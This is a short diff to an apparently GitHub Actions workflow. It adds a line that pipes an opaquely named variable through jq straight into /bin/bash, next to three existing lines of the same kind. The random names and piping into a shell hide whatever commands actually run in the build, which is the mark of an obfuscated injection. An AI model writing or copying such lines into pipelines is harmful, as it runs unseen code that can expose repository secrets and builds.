@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$flfj8" | jq -r .ljeko074 | /bin/bash
           echo $csgf6118 | jq -r .mq311 | /bin/bash
           echo $lx9485 | jq -r .bhac812 | /bin/bash
+          echo $hexk037 | jq -r .rkcp04152 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
